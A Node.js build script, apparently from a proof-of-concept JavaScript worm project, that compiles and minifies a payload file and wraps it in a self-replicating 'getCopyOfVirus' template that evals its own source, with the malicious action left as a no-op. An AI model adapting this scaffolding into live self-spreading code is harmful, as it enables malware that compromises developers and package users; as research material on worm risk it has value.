const fs   = require( "fs-extra" );
const exec = require( "child-process-promise" ).exec;

const maliciousAction = "() => null";

function getCopyOfVirus( maliciousAction, virusSrc ) {
    function escape( str ) {
        return str.replace(/[\\"]/g, "\\$&");
    }
    return `
        (function() {
            var maliciousAction = "${escape(maliciousAction)}";
            var virusSrc = "${escape(virusSrc)}";
            var fn = eval( virusSrc );
            fn( maliciousAction, virusSrc );
        })();
    `;
}

async function build() {

    var src      = "body.js";
    var compiled = ".build/payload.compiled.js";
    var minified = ".build/payload.min.js";
    var tgt      = "payload.built.js";

    await fs.ensureDir( ".build" );
    await exec( `cat ${src} | ./node_modules/.bin/babel -o ${compiled} --presets es2015` );
    await exec( `./node_modules/.bin/uglifyjs --mangle --compress -o ${minified} ${compiled}` );

    var virusSrc = await fs.readFile( minified, "utf-8" );
    var notStrict = virusSrc.replace( "\"use strict\";", "" );
    await fs.writeFile( tgt, getCopyOfVirus( maliciousAction, notStrict ) );
}

build();
